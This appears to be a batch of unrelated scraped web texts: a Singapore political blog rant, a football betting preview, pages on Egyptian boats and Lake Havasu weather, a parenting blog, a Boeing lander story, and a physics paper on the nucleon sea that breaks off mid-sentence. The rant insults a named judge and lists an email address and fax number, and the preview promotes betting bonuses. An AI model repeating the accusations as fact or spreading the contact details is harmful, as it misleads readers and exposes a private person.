prison for 2 months? Judge Judith Prakash of the Supreme Court Singapore has prostituted herself in her capacity as a judge hearing the Kangaroo T shirt case on November 24, 2008 by being nothing more than an employee of Lee Kuan Yew and his son, whom he appointed Prime Minister. By her actions in sending these young men to prison and making them pay crippling court costs of $5,000.00 each, she has shamelessly disgraced herself, her office of a judge, disgraced the Singapore Constitution and disgraced Singapore.\nShame on you, woman.\nFax: 510 657 6914 Email: nair.gopalan@yahoo.com\nI have no doubt I will be disbarred from practicing law in Lee Kuan Yew's Singapore courts. It is one of their principle ways to ensure that no one else criticizes them and a chill tricles down the spine of every single person in the island to keep them in line as demanded. As for me, once they do this, I will have another oppurtunity to prove that Singapore law is nothing but Lee Kuan Yew's personal set of rules to keep him, his family and his cronies in power. I hope this will have an even more damaging effect of the credibility of the administration of law in Singapore. As it is, there are only 3847 lawyers practicing there in that island of a full 5 million people, a very unsatisfactory number. It is hoped that even more lawyers would be persuded not to have anything more to do with a legal system such as this. Each one of these actions by this administration helps to hammer in one more nail into the coffin of their total decline.\nThe writings in this blog will continue.\nLee Kuan Yew's Singapore: Ein Reich Ein Volk Ein F...\nSingapore's Chief Justice speaks with forked tongu...\nSingapore's Lee Kuan Yew says he prefers strong go...\nSingapore.

Read below our Sevilla vs Liverpool betting preview with predictions, betting tips, starting lineups, team news, boosted odds, bookie free bets and no deposit bonuses on this clash!\nSevilla can secure a place in the Champions League knockout stages if they beat Liverpool at home as they only trail the Reds by one point. The Spanish side are a team in good form despite the recent defeat to Barcelona. They won four of their last five games, and each of their last seven home games in all competitions. They have won from behind to beat Celta Vigo at the weekend. The result moved the team back up to fifth place in the La Liga standings, but they're already 12 points behind leaders Barcelona. Eduardo Berizzo's men home form is really impressive - the Andalusians have not suffered a single competitive defeat in front of the home fans so far this season. Sevilla and Liverpool played out an entertaining 2-2 draw at Anfield back in September.\nHead-coach Berizzo has a number of absentees including centre-backs Daniel Carrico and Nicolas Pareja, while winger Joaquin Correa and Gabriel Mercado are major doubts despite they returned to training following muscle injuries. Wissam Ben Yedder is expected to lead the line with Ever Banega, Pablo Sarabia and former Man-City winger Jesus Navas play as offensive midfielders, altough Nolito is pushing for a start. Steven Nzonzi and Guido Pizarro will anchor the midfield with Michael Krohn-Delhi as back-up option, while Simon Kjaer and Clement Lenglet will be the central defensive pair.\nAfter starting their Champions League campaing two draws against Sevilla and Spartak Moscow, Liverpool climbed to the top of the Group E table thanks to a couple of wins over Maribor, netting 10 times without conceding in that double-header. Anyway, their place in the knockout stage of the competition is far from secure with Sevilla just one point behind and Spartak Moscow only a point further back. The Reds have won their last four outing in emphatic fashion - 3-0 wins over Huddersfield Town, Maribor and Southampton as well as a 4-1 success at West Ham at the weekend. Anyway, Jurgen Klopp's defense has been shaky on the road so far, managing only one clean sheet away from home this season.\nSadio Man\u00e8 suffered a recurrence of his hamstring injury while on international duty for Senegal and is a doubt. The attacking trio will be likely formed by Philippe Coutinho, Roberto Firmino and the in-form Mohamed Salah. A very minor muscle strain kept Joel Matip out on Saturday meaning that Dejan Lovren and Ragnar Klavan are expected to start as centre backs. Adam Lallana is in contention to make the bench after returning to training while Daniel Sturridge was an unused substitute against the Saints and is likely to feature. Alex Oxlade-Chamberlain and Dominic Solanke are other players who could play during the second half.\n\"Sevilla vs Liverpool predictions, betting tips, lineups and odds (Champions League - 21.11.2017)\"", "meta": {"redpajama_set_name": "RedPajamaC4"}, "__index_level_0__": 47596}

The Nile provided an excellent means of transport and every corner of the city could be reached by boats. Need for an efficient navy was recognized by Pharaohs like Senefru who had a fleet of 40 ships.\nShips and Egyptian Boats were built for fishing, trade, transportation, processions and travel.\nAgricultural produce, troops, cattle, stone and funeral processions were all carried on the Nile and its canals. Animals and goods were transported. For Egyptians, both building and rowing a boat were not easy jobs. The wood was cut with a chisel.\nTypes of Egyptian Boats\nMainly three types of Egyptian boats for different purposes were made in ancient Egypt. Simple reed rafts were used mostly for hunting in marshes. Eventually, stronger wooden boats were used for lengthy ocean excursions as well as to transport boulder blocks weighing many tons.\nThe third type of boat was the papyri from the boat. Papyrus boats were used for daily activities like hunting or religious ceremonies. These boats were made of bundles of bound papyrus reeds, and were lashed together into a long thin hull form in the style of a slight crescent.\nSailboats were also in use which had one square sail. The elegant Funeral boats were used to carry the dead across Nile river. They were buried along with the dead. When this became expensive, models of boats were buried. Military ships gradually evolved. Model boats for the symbolic journey of the sun god were also found.\nThe earliest record of a ship under sail is depicted on an Egyptian pot dating back to 3200BC. These Egyptian boats were made of either native woods or conifers from Lebanon. Cedar was important as a boat building material. Boats were often named.\nThe world's oldest boat is found in the pyramid of King Khufu. It is a good example of papyri from a boat. The pieces were found unassembled. Some believe it was for the king to use in his afterlife.\nThe Abydos boats were discovered in 2000. They are a great white, 'ghostly' fleet of 14 boats. They were about 25 metres long, two to three metres wide and about sixty centimetres deep, seating 30 rowers. The pharaohs prided themselves on their pleasure boats with multiple decks containing cabins, kitchens, dining rooms and lounges.\nFacts about Egypt\nFacts about Ancient Egypt\nAncient Egypt History Timeline\nAncient Egyptian Music\nAncient Egyptian Hieroglyphs\nAncient Egyptian Coffins\nAncient Egypt Amun Facts\nBook of the Dead Spells\nCanopic Jars & mummification\nAlphabets A to Z\nAncient Mesopotamians\nGupta Empire\nAncient China Life\nAncient Roma\nAncient Greece Thebes\nEgyptian Climate\nAncient Egypt Physical Features\nAncient Egyptian Numbers & Numeral system\nNames of Famous Ancient Egyptian Gods\nAncient Egypt Akasha\nAncient Egyptian Toilets\nCopyright \u00a9 2021 Facts About Ancient Egyptians.", "meta": {"redpajama_set_name": "RedPajamaCommonCrawl"}, "__index_level_0__": 38611}

These nights that happen at least once a week robbing me of much needed sleep and seriously questioning my sanity.\nThe only thing that gets me through is realizing that when Ellie finally starts sleeping like a normal child, I will never have to consistantly lose sleep again. That's because we will have no more children. For me, that decision was based on the issue of sleep alone, and I don't feel one bit of remorse for that.\nI don't think my body could handle another bad sleeper, and I am confident that my emotional well being could not either. It's brutal, ya'll.\nThe silver linking is that I am my own biggest cheerleader because this isn't my first rodeo. Not by a long shot. I've done this before. I logged countless sleeplees hours with Eli walking a thousand miles up and down the hallway. I've paced , and cried, and yelled, and cussed, and prayed. I've done it all only to get up and go to work and press repeat night after night.\nI've battled depression and overcome. I've conquered that beast, and some how, some way, I'll find a way to keep going.\nAs God is my witness, I'll never stay up all night again. Ha! Sorry, had to throw a little Scarlett O'Hara hunor in there.\nI'll wake up for the day in an hour and 20 minutes, assuming that I even sleep. Then I'll take a shower to wash away the night and make a strong pot or two of coffee. I'll get the kids up, battle the normal morning routine of getting them dressed, and fed, and dropped off at daycare before 7:30. From there I will drive to work and jump right back into the cycle of my day.\nSleep deprivation is a form of torture used by militant forces...and the Watson children. Ha!\nNo really, sleep deprivation is serious and so is the toll is takes on a person. Trust me, I know. I also know that this too shall pass, and God gives us strength for the day. I can't worry about next week or next month. Today. He will give me the strength I need to make it through today.\nI know this is a long and and jumbled post, but I needed to process through some things to arrive at that last thought. If you've made it this far, say a prayer for me. I'm going to need all the strength I can get today to muttle through routines, the meetings, the homework, the cooking, and the parenting that will take place in the day ahead.

{"text": "Home- Stories -Boeing Unveils 'Fewest Steps' Lunar Lander for NASA\nBoeing Unveils 'Fewest Steps' Lunar Lander for NASA\n: Nov 6, 2019 - : 4:02 am\nBoeing submitted a proposal to NASA for an integrated Human Lander System (HLS) designed to safely take astronauts to the surface of the moon and return them to lunar orbit as part of the Artemis space exploration program.\nThe company's proposal calls for delivering the lander's Ascent Element and Descent Element to lunar orbit in one rocket launch to ensure it is tailored for maximum capability and crew safety. This approach reduces the complexity and risk of sending multiple segments to orbit on multiple launches, enabling a crewed lunar surface landing with only five mission critical events instead of the 11 or more required by alternate strategies. Boeing's integrated lander also can carry itself from lunar orbit to the surface without an additional transfer stage or \"space tug,\" further reducing launches and simplifying the steps to a successful landing.\n\"Using the lift capability of NASA's Space Launch System (SLS) Block 1B, we have developed a 'Fewest Steps to the Moon' approach that minimizes mission complexity, while offering the safest and most direct path to the lunar surface,\" said Jim Chilton, senior vice president of Space and Launch for Boeing Defense, Space & Security.\nBoeing's design relies on NASA's exploration backbone, the SLS rocket currently in production at NASA's Michoud Assembly Facility (MAF). The SLS has an unmatched lift capability that builds on proven flight components. This approach shortens development time and lowers risk, enabling NASA to safely land on the moon's surface by 2024.\nThe lander's flexible design allows for the fastest path to lunar flights while providing a robust platform that can perform NASA's full range of exploration missions. It can dock with the Gateway lunar orbiter or directly with NASA's Orion to eliminate the need for an additional spacecraft, both on time to meet the 2024 mandate.\nThe design includes innovations in its engines, composites, and automated landing and rendezvous systems. Key technologies are based on the Boeing CST-100 Starliner spacecraft, which will be fully demonstrated and proven during its upcoming Orbital Flight Test to the International Space Station in December 2019.\nBoeing partnered with NASA's Marshall Space Flight Center, Johnson Space Center, and Kennedy Space Center and will collaborate closely with NASA to integrate, certify, and operate this innovative HLS. The company also will provide the critical resources and industry knowledge required to ensure on-time delivery in support of a 2024 lunar landing. Whether serving in NASA's 2024 or 2025 mission slot, Boeing's approach maximizes return from agency investments in previous and ongoing programs to allow for the simplest and therefore highest probability path back to the lunar surface.\nboeing-space / nasa /", "meta": {"redpajama_set_name": "RedPajamaCommonCrawl"}, "__index_level_0__": 83294}

{"text": "Lake Havasu City\nArizona, USA: 55.405 locations\nLake Havasu City, AZ US\nThe climate of Lake Havasu City\nThe best time to visit Lake Havasu City\nThe worst time to visit Lake Havasu City\nLake Havasu City has a tropical and subtropical, hot desert type of climate (K\u00f6ppen climate classification BWh) with hot and dry summers and mild winters.\nIt lies in the Mohave County of Arizona, on the eastern shores of Lake Havasu and the border between Arizona and California. The city lies in the proximity of the Colorado River and has topography of mountains, desert lands, and farmlands.\nLake Havasu City registers around 3700 hours of sunshine in the year. The sunshine is present for about 80% of the daylight hours. The city is one of the driest, hottest and least humid places in the United States. Annual precipitation is scarce to the tune of 4.2\" (106.7mm) with only 30 rainy days in the year. Rainfall occurs throughout the year, except May and June. Although the rain is negligible, the region is prone to flash floods and thunderstorms. Snow is rare, but there is a history of occasional snowfall.\nSummers are scorching hot in Lake Havasu City with the average high temperatures between 104\u00b0F (40\u00b0C) and 109\u00b0F (42.8\u00b0C). High temperatures cross 120\u00b0F (48.9\u00b0C) during the peak of July and are routinely between 100\u00b0F (37.8\u00b0C) and 115\u00b0F (46.1\u00b0C) in the summer. Nights are warm with the temperatures in the 75\u00b0F (23.9\u00b0C) to 90\u00b0F (32.2\u00b0C) range.\nWinters are mild with the average high temperatures in the 63\u00b0F (17.2\u00b0C) to 70\u00b0F (21.1\u00b0C). The low temperatures are usually in the 40\u00b0F (4.4\u00b0C) to 50\u00b0F (10\u00b0C) zone but occasionally drop below 40\u00b0F (4.4\u00b0C).\nSpring and autumn are brief periods as the hot weather dominates the better part of the year. The skies tend to be clear with a lack of moisture in the air for the majority of the year.\nThe highest recorded temperature in Lake Havasu City is 128\u00b0F (53.3\u00b0C) on June 29, 1994, which is also the record for Arizona.\nThe best time to visit Lake Havasu City is when the temperatures cool down between November to March.\nThe winter is mild at best, and the temperatures rarely drop below 40\u00b0F (4.4\u00b0C). The average high temperatures are in the 64\u00b0F (17.8\u00b0C) to 74\u00b0F (23.3\u00b0C) range while the average low temperatures are in the 43\u00b0F (6.1\u00b0C) to 51\u00b0F (10.6\u00b0C) zone. Nights are clear and perfect for stargazing in the absence of strong winds across the vast open landscape.\nThe summer crowds disperse during the winter, but the sunny city is the winter home for people from cold regions of Canada and the northern United States.\nThe period from June to September is the worst time to visit Lake Havasu City due to the extreme heat. Summer sees thunderstorms and scorching heat in the city. The daily high temperatures are mostly in the 100\u00b0F (37.8\u00b0C) to 115\u00b0F (46.1\u00b0C) range with many days even crossing 120\u00b0F (48.9\u00b0C).\nSummer draws crowds despite the heat as many events including local and international tournaments take place during the hot months - no wonder that accommodations are costly during the period.\nLake Havasu City is prone to flash floods and lightning strikes in the hot, long and dry summer. June to September witnesses many thunderstorms in the region. The arid and sparse vegetation in the region is unable to absorb rainfall even in small quantities during the storms, which quickly turn dry streambeds into raging water torrents.\nJanuary is one of the best times to visit Lake Havasu City, as the winter is mild with the average temperatures in the 44\u00b0F (6.7\u00b0C) to 64\u00b0F (17.8\u00b0C) range. Weather in January \u00bb\nFebruary sees mild temperatures in the average range of 47\u00b0F (8.3\u00b0C) to 70\u00b0F (21.1\u00b0C) in Lake Havasu City. The days tend to be warm with 11 hours of daylight. Weather in February \u00bb\nMarch brings the short spring season to Lake Havasu City with brief spells of rain. The temperatures are usually in the 51\u00b0F (10.6\u00b0C) to 77\u00b0F (25\u00b0C) range. Weather in March \u00bb\nThe average temperatures are in the zone of 59\u00b0F (15\u00b0C) to 85\u00b0F (29.4\u00b0C) as the fishing season attracts crowds along Lake Havasu and the Colorado River. Weather in April \u00bb\nMay raises the heat in Lake Havasu City as the average high temperature crosses 95\u00b0F (35\u00b0C). The humidity is low as the sun chases the clouds from the skies. Weather in May \u00bb\nJune is the driest month in Lake Havasu City as the beginning of the hot summer season registers average temperatures in the 77\u00b0F (25\u00b0C) to 105\u00b0F (40.6\u00b0C) range. Weather in June \u00bb\nThe peak of the summer sees temperatures consistently above 110\u00b0F (43.3\u00b0C) with some days even crossing 120\u00b0F (48.9\u00b0C). Weather in July \u00bb\nThe temperatures register in the range of 84\u00b0F (28.9\u00b0C) to 108\u00b0F (42.2\u00b0C) on an average with many days touching 115\u00b0F (46.1\u00b0C) and a few even 120\u00b0F (48.9\u00b0C). Weather in August \u00bb\nThe temperatures scale down a bit as compared to the summer, and the average ranges between 75\u00b0F (23.9\u00b0C) to 101\u00b0F (38.3\u00b0C). Weather in September \u00bb\nOctober begins the brief autumn season with the average temperatures dropping between 62\u00b0F (16.7\u00b0C) to 88\u00b0F (31.1\u00b0C) in Lake Havasu City. Weather in October \u00bb\nNovember sees mild temperatures in the range of 51\u00b0F (10.6\u00b0C) to 74\u00b0F (23.3\u00b0C) as the autumn reaches its peak in Lake Havasu City. Weather in November \u00bb\nThe average low temperatures are in the mild 43\u00b0F (6.1\u00b0C) to 63\u00b0F (17.2\u00b0C) range, and it is rare for nights to touch the freezing mark of 32\u00b0F (0\u00b0C).

{"text": "\\section{Introduction}\n\nThere have recently been some very promising advances in lattice QCD as\na result of the development of improved actions\\cite{LL}. \nIn addition, we have a\nwealth of sophisticated models of hadron structure built on our\nknowledge of QCD, especially its symmetries. While lattice QCD cannot\nyet compete with such models in certain critical areas of hadron\nstructure, such as dynamical symmetry breaking, all theoretical\napproaches can benefit from precise experimental insights into the\nproblem. Apart from the usual low energy properties, such as masses,\ncharge radii and magnetic moments, there is a wealth of information\navailable from deep-inelastic scattering which is just beginning to be\ntaken seriously as a source of information on \nnon-perturbative physics\\cite{DISS}.\n\nWe shall review the latest experimental information on the light-quark\nsea of the nucleon, which shows a dramatic deviation from the naive\nexpectations of perturbative QCD. From this starting point it is natural\nto ask about the strange and even the charm components of the sea of the\nnucleon. These components will be the focus of considerable\ninvestigation in the near future. From the sea we turn to the behaviour\nof the valence quark distributions and particularly the behaviour of the\ndistributions at large-$x$. Here too there are a number of surprises\nfrom the most recent analysis of the experimental data and, in the case\nof spin-dependent distributions, some interesting ideas to be tested.\n\n\\section{SU(2)$_F$ Violation}\n\nThe fundamental degrees of freedom in QCD are quarks and gluons, and for\na considerable time there was great reluctance to include any other\ndegrees of freedom in modeling hadron structure.\nOn the other hand, extensive studies of non-perturbative QCD have shown \nthat the chiral symmetry of the QCD Lagrangian is dynamically broken and \nthat the resulting, massive constituent quarks must be coupled to pions.\nAs pseudo-Goldstone bosons, the latter would be massless in the chiral \nlimit.\nMost importantly, as emphasised by extensive work on chiral perturbation \ntheory, {\\em no perturbative treatment of $q \\bar{q}$ creation and \nannihilation can ever generate the non-analytic behaviour in the light\nquark mass for physical quantities (such as $M, <r^2>, \\sigma_{\\pi N}$) \nwhich are generated by these Goldstone bosons}.\nAs a consequence, it is now difficult to imagine a realistic quark model\nwhich does not incorporate at least the pion cloud of the nucleon.\n\\begin{figure}[htb]\n\\begin{center}\n\\epsfig{file=k1.ps,height=8cm}\n\\caption{Comparison of the value of $\\bar{d}/\\bar{u}$ extracted from the\n\trecent E866 data \\protect\\cite{E866} with the expectations from\n\tjust the $\\pi N$ Fock component of the nucleon wave function,\n\tfor three different form factors at the $\\pi N$ vertex -- from\n\tRef. \\protect\\cite{MT_fewb}.}\n\\end{center}\n\\end{figure}\n\nThe development of chiral quark models began in the late 1970's\n\\cite{IM,CHT,BRR,CBM} and it became clear that the pion field had very\nimportant practical consequences for the low energy properties of hadrons.\nFor example, the coupling to a ``bare'' nucleon lowers its mass by several\nhundred MeV, and can contribute a large part of the $N-\\Delta$ mass \ndifference, while the charge form factor of the neutron is a first\norder effect of its pion cloud \\cite{CBM}. \n\nHowever, the relevance of the pion cloud for deep inelastic scattering,\nwhich had been first realized by Sullivan \\cite{SULL},\nwas not explored in depth until the discovery of the nuclear EMC effect,\nwhen it was suggested that the effect might be caused by a nuclear\nenhancement of the pion field of the bound nucleons \\cite{CLLS,ET}.\nAt this time it was realized that the light mass of the pion would lead\nto an enhancement of the non-strange over the strange sea of the nucleon\n\\cite{THO83}, and this was used to put a constraint on the pion--nucleon\nform factor --- a limit that has since been explored in detail \\cite{FMS}.\nA more important consequence of the nucleon's pion cloud, which was also \npointed out in Ref.\\cite{THO83}, was an excess of $\\bar{d}$ over $\\bar{u}$\nquarks.\nIn particular, simple Clebsch-Gordan coefficients for isospin show that\nthe pion cloud of the proton is in the ratio 2:1 for $\\pi^+:\\pi^0$.\nSince the $\\pi^+$ contains only a valence $\\bar{d}$ and the $\\pi^0$\nequal amounts of $\\bar{d}$ and $\\bar{u}$, this component of the pion\ncloud of the nucleon yields a ratio for $\\bar{d}:\\bar{u}$ of 5:1.\n\nOn the other hand, perturbative QCD inevitably leads to the conclusion\nthat $\\bar{u} = \\bar{d}$, a result known as SU(2)-flavor, SU(2)$_F$, \nsymmetry.\nThe latter is a very misleading name as there is {\\em no rigorous\nsymmetry involved}.\nIndeed, the prediction that the component of the sea arising from\nthe long-range piece of the pion cloud of the nucleon satisfies \n$\\bar{d}:\\bar{u}$ = 5:1 is totally consistent with charge independence.\nThus the violation of the Gottfried sum rule and the subsequent\nmeasurement of $\\bar{d} - \\bar{u}$ gives us direct evidence that there\nis a sizable non-perturbative component of the nucleon sea.\nVarious studies of the pion cloud of the nucleon since the original NMC\nmeasurement \\cite{NMCO} have concluded that this is indeed the most\nlikely explanation of the observed violation of the sum rule \n\\cite{SPTH,HM,SST,KL,HSB}. \n\n\nIn Fig.1 we show the calculated ratio of $\\bar{d}/\\bar{u}$ from the\n$\\pi N$ Fock component of the nucleon wave function as a source of \nasymmetry, in comparison with the data points extracted from the \npreliminary results \\cite{E866} from the E866 collaboration on the\nratio of $pD$ and $pp$ Drell-Yan cross sections.\nThe calculation was performed in the light-cone formalism \\cite{MTLC,ZOLL}\nwith a monopole $\\pi NN$ form factor mass parameter $\\Lambda = 0.7,\n1.0$ and 1.3 GeV --- from smallest to largest.\nClearly the agreement is qualitatively excellent, but a more detailed\nanalysis needs to be carried out once all the data have been analysed.\nLet us emphasise once more the importance of these data, which are giving\nus direct insight into the way dynamical chiral symmetry breaking is\nrealized in the nucleon.\n\n\\section{Intrinsic strangeness and charm}\n\nThe experience with the breaking of SU(2)$_F$ symmetry, which we have\njust described, leads us to take much more seriously the possibility of\nan intrinsic component of the strange and charm quark sea.\nThe former was first discussed by Signal and Thomas \\cite{ST} and has\nrecently been investigated by a number of authors \\cite{BROD,SMSBAR}\nin the light of new neutrino data from CCFR \\cite{CCFR}. The implication\nof a non-perturbatively generated component of the strange sea is a\nmarked asymmetry between $s$ and $\\bar{s}$, which \nwill clearly be the subject of much more detailed investigation in \nfuture.\n\nWith regard to the question of intrinsic charm, there has been some\nsuggestion that it may play a role in the anomalous events seen recently\nat HERA -- see section 5 below. For example, Gunion and Vogt \\cite{GV}\nexamined a model of the 5-quark component of the nucleon \nwave function on the light-cone \\cite{BHPS}.\n{}Following Brodsky {\\em et al.} \\cite{BHPS}, the wave function was \nassumed to be inversely proportional to the light-cone energy difference\nbetween the nucleon ground state and the 5-quark excited state.\nThe resulting $x$-dependence of the inclusive $c$ quark distribution\nin the minimal model of \\cite{GV} was given by \\cite{BHPS}:\n\\begin{eqnarray}\n\\label{delic}\n\\delta^{(IC)} c(x)\n&=& 6 x^2 \\left( (1-x) (1 + 10x + x^2) - 6x (1+x) \\log 1/x \\right),\n\\end{eqnarray}\nwith the normalization fixed to 1\\%.\nSuch a distribution peaks at $x \\sim 0.2$, and is\nnegligible beyond $x \\sim 0.7$.\nThe anti-charm distribution is assumed to be equal to the charm\ndistribution in this model,\n$\\delta^{(IC)} \\overline c(x) = \\delta^{(IC)} c(x)$.\n\nAs an alternative to the intrinsic charm picture of Refs.\\cite{GV,BHPS},\nin Refs.\\cite{NNNT,PNNDB} the charmed sea was taken to arise from the\nquantum fluctuation of the nucleon to a virtual $D \\Lambda_c$\nconfiguration -- by analogy with the successful description of the\nobserved $\\bar{d} - \\bar{u}$ asymmetry in the light-quark sector.\nThe nucleon charm radius \\cite{NNNT} and the charm quark distribution \n\\cite{PNNDB} were both estimated in this framework.\nWhether the same philosophy can be justified for a cloud of heavy charmed\nmesons and baryons around the nucleon is rather more questionable given\nthe large mass of the fluctuation.\nNevertheless, to a first approximation, we may take the meson cloud\nframework as an indicator of the possible shape\nof the non-perturbative charm distribution.\nA natural prediction of this model are highly asymmetric $c$\nand $\\overline c$ distributions.\n\nIn the meson cloud model, the distribution of charm quarks in the\nnucleon on the light cone at some low hadronic scale is written\nin convolution form\\cite{MT_HERA}:\n\\begin{eqnarray}\n\\delta \\overline c(x)\n&=& \\int_x^1 {dz \\over z} f_{D/N}(z)\\ \n\t\\overline c^{D}\\left({x \\over z}\\right),\\ \\ \n\\delta c(x)\n\\ =\\ \\int_x^1 {dz \\over z} f_{\\Lambda_c/N}(z)\\ \n\tc^{\\Lambda_c}\\left({x \\over z}\\right),\n\\end{eqnarray}\nwhere $z$ is the fraction of the nucleon's light-cone momentum \ncarried by the $D$ meson or $\\Lambda_c$.\nThe light cone (or infinite momentum frame) distribution of $D$\nmesons in the nucleon is given by:\n\\begin{equation}\n\\label{fz}\nf_{D/N}(z)\n=\\int_0^\\infty \\frac{dk^2_\\perp}{16\\pi^2}\n{ g^2(k_\\perp^2,z) \\over z (1-z) (s_{D \\Lambda_c} - M_N^2)^2 }\n\\left( { k_\\perp^2 + [M_{\\Lambda_c} - (1-z) M_N]^2 \\over 1-z } \\right),\n\\end{equation}\nand can be shown to be related to the light-cone distribution of \n$\\Lambda_c$ baryons, $f_{\\Lambda_c/N}(z)$,\nby $f_{\\Lambda_c/N}(z) = f_{D/N}(1-z)$.\nIn Eq.(\\ref{fz}) the function $g$ describes the extended nature of the\n$D\\Lambda_c N$ vertex, with the momentum dependence parameterized by\\\n$g^2(k_\\perp^2,z)\\\n=\\ g_0^2\\ (\\Lambda^2 + M_N^2)/(\\Lambda^2 + s_{D\\Lambda_c})$,\nwhere the $D\\Lambda_c$ center of mass energy squared\nis given by\\ \n$s_{D \\Lambda_c} = (k_\\perp^2 + M_D^2)/z\n\t\t + (k_\\perp^2 + M_{\\Lambda_c}^2)/(1-z)$,\nand $g_0$ is the $D \\Lambda_c N$ coupling constant at the\npole, $s_{D \\Lambda_c} = M_N^2$.\nWe expect $g_0$ to be similar to the $\\pi NN$ coupling constant.\n\nBecause of the large mass of the $c$ quark, one can approximate the\n$\\overline c$ distribution in the $D$ meson \\cite{PNNDB} and the\n$c$ distribution in the $\\Lambda_c$ by:\n\\begin{eqnarray}\n\\overline c^{D}(x) &\\approx& \\delta(x-1),\\ \\ \\\nc^{\\Lambda_c}(x)\\ \\approx\\ \\delta(x-2/3),\n\\end{eqnarray}\nwhich then gives:\n\\begin{eqnarray}\n\\label{mcm_final}\n\\delta \\overline c(x) &\\approx& f_{D/N}(x),\\ \\ \\ \\ \\ \\ \n\\delta c(x)\\ \\approx\\ {3 \\over 2} f_{\\Lambda_c/N}(3x/2).\n\\end{eqnarray}\n\n\\begin{figure}[hbt]\n\\begin{center}\n\\epsfig{file=k2.ps,height=8cm}\n\\caption{The non-perturbative $\\delta c$ and $\\delta \\overline c$\ndistributions in the meson cloud model \\protect\\cite{MT_HERA} (the latter\nnormalized to 1\\%). Also shown is the light-cone intrinsic charm\ndistribution, $\\delta^{(IC)} c$, of Refs.\\protect\\cite{GV,BHPS} and the\nmodification $\\delta u$ of the valence $u$ distribution from \nRef.\\protect\\cite{KLT}. The purely perturbative contribution at\n$Q^2=$4~GeV$^2$ is also shown.}\n\\end{center}\n\\end{figure}\nThe resulting $\\delta c$ and $\\delta \\overline c$ distributions are shown\nin Fig.2, calculated for an ultraviolet cutoff of $\\Lambda \\approx 2.2$~GeV,\nwhich gives\n$\\int_0^1 dx \\delta c(x) = \\int_0^1 dx \\delta \\overline c(x) \\approx 1\\%$.\nFor a probability of 0.5\\% one would need a smaller cutoff,\n$\\Lambda \\approx 1.7$~GeV.\nQuite interestingly, the shape of the $c$ quark distributions is  \nsimilar to that in the intrinsic charm model of Refs.\\cite{GV,BHPS}.\nHowever, as mentioned above, the model of \\cite{GV,BHPS} assumes identical\nshapes for the non-perturbative $c$ and $\\overline c$ distributions, while\nthe meson cloud gives a significantly harder $\\overline c$ distribution.\nIt is a very important issue for our understanding of strong interaction\ndynamics whether or not the charm quark distributions exhibit such an\nasymmetry. \n\n\\section{The role of perturbative QCD at large-$x$}\n\nThe precise mechanism whereby the SU(6), spin-flavor symmetry of the\nparton\ndistributions of the nucleon is broken is a question of fundamental\nimportance in hadronic physics.\nThe SU(6) spin-flavour wave function of a proton,\npolarized in the $+z$ direction, has the form \\cite{CLO79}:\n\\begin{eqnarray}\n\\label{pwfn}\n\\left| p\\uparrow \\rangle \\right.\n&=& {1 \\over \\sqrt{2}} \\left| u\\uparrow (ud)_{S=0} \\rangle \\right. \\\n +\\ {1 \\over \\sqrt{18}} \\left| u\\uparrow (ud)_{S=1} \\rangle \\right. \\\n -\\ {1 \\over 3}  \\left| u\\downarrow (ud)_{S=1} \\rangle \\right. \\\n\\nonumber \\\\\n& &\n -\\ {1 \\over 3}  \\left| d\\uparrow (uu)_{S=1} \\rangle \\right. \\\n -\\ {\\sqrt{2} \\over 3} \\left| d\\downarrow (uu)_{S=1} \\rangle \\right.,\n\\end{eqnarray}\nFor the neutron to proton structure function ratio this implies:\n\\begin{eqnarray}\n{ F_2^n \\over F_2^p }\n&=& {2 \\over 3}\\ \\ \\ \\ \\ \\  ; \\ \\ \\ \\ {\\rm SU(6)\\ symmetry}.\n\\end{eqnarray}\n\nOf course, SU(6) spin-flavor symmetry is not exact.\nThe nucleon and $\\Delta$ masses are split by some 300 MeV and\nempirically\nthe $d$ quark distribution is softer than the $u$.\nThe correlation between the mass splitting in the {\\bf 56} baryons and\nthe\nlarge-$x$ behavior of $F_2^n/F_2^p$ was observed some time ago by Close\n\\cite{CLO73} and Carlitz \\cite{CAR75}.\nBased on phenomenological arguments,\nthe breaking of the symmetry in Eq.(\\ref{pwfn}) was argued to arise from\na suppression of the ``diquark'' configurations having $S=1$ relative to\nthe $S=0$ configuration.\nSuch a suppression is, in fact, quite natural if one observes that\nwhatever\nmechanism leads to the observed $N-\\Delta$ splitting (e.g.\ncolor-magnetic\nforce, instanton-induced interaction, pion exchange), necessarily acts\nto\nproduce a mass splitting between the possible spin states of the\nspectator\npair, $(qq)_S$, with the $S=1$ state heavier than the $S=0$ state by\nsome\n200 MeV \\cite{CT}.\n{}From Eq.(\\ref{pwfn}), a dominant scalar valence diquark component of\nthe\nproton suggests that in the $x \\rightarrow 1$ limit $F_2^p$ is\nessentially\ngiven by a single quark distribution (i.e. the $u$), in which case:\n\\begin{eqnarray}\n{ F_2^n \\over F_2^p }\n&\\rightarrow& { 1 \\over 4 }, \\ \\ \\ \\ \\\n{ d \\over u } \\rightarrow 0\\ \\ \\ \\ \\\n; \\ \\ \\ \\ S=0\\ {\\rm dominance}.\n\\end{eqnarray}\nThis expectation has, in fact, been built into all phenomenological fits\nto the parton distribution data.\n\nAn alternative suggestion, based on perturbative QCD, was originally\nformulated by Farrar and Jackson \\cite{FJ}.\nThere it was argued that the exchange of longitudinal gluons, which are\nthe only type permitted when the spin projections of the two quarks in\n$(qq)_S$ are aligned, would introduce a factor $(1-x)^{1/2}$ into the\nCompton amplitude --- in comparison with the exchange of a transverse\ngluon between quarks with spins anti-aligned.\nIn this approach the relevant component of the proton valence wave\nfunction\nat large $x$ is that associated with states in which the total\n``diquark''\nspin {\\em projection}, $S_z$, is zero.\nConsequently, scattering from a quark polarized in the opposite\ndirection\nto the proton polarization is suppressed by a factor $(1-x)$ relative to\nthe helicity-aligned configuration.\n\\begin{figure}[hbt]\n\\begin{center}\n\\epsfig{file=k3.ps,height=8cm}\n\\caption{$F_2^D/F_2^N$ ratio as a function of $x$ for the model of\n\tRefs.\\protect\\cite{MST1,MST2} (solid) which accounts for\n\toff-shell kinematics, and the on-shell model of\nRef.\\protect\\cite{FS} (dotted) --- from\nRef.\\protect\\cite{MST2}.}\n\\end{center}\n\\end{figure}\n\n\nA similar result is also obtained in the treatment of Brodsky {\\em et\nal.}\n\\cite{BBS} (based on counting-rules), where the large-$x$ behavior of\nthe\nparton distribution for a quark polarized parallel ($\\Delta S_z = 1$) or\nantiparallel ($\\Delta S_z = 0$) to the proton helicity is given by:\n$q^{\\uparrow\\downarrow}(x) = (1~-~x)^{2n - 1 + \\Delta S_z}$,\nwhere $n$ is the minimum number of non-interacting quarks (equal to 2\nfor\nthe valence quark distributions).\nIn the $x \\rightarrow 1$ limit these arguments, based on 